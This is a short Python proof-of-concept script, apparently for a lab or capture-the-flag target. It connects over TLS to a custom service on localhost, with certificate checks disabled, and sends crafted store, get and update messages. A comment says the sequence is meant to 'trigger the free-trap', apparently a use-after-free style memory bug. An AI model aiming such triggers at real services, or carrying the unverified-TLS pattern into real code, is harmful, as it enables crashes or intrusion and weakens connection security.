import socket,ssl,struct,hashlib,time
ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
ctx.minimum_version=ssl.TLSVersion.TLSv1_3; ctx.maximum_version=ssl.TLSVersion.TLSv1_3
s=ctx.wrap_socket(socket.create_connection(("127.0.0.1",1443),timeout=5))
data=b"hello world"; key=b"A"*16; iv=b"B"*16
s.sendall(struct.pack("<I",0x38432A87)+key+iv+struct.pack("<I",len(data))+data)
time.sleep(0.2)
s.sendall(struct.pack("<I",0x89954D3E)+hashlib.md5(data).digest())
time.sleep(0.3)
print("get:", s.recv(200))
time.sleep(0.2)
# update to PAYLOAD2 then trigger the free-trap
s.sendall(struct.pack("<I",0xDC375626)+hashlib.md5(data).digest()+struct.pack("<I",8)+b"PAYLOAD2")
time.sleep(0.3)
s.sendall(struct.pack("<I",0x89954D3E)+hashlib.md5(b"PAYLOAD2").digest())
time.sleep(0.3)
try: print("get2:", s.recv(200))
except Exception as e: print("err", type(e).__name__)
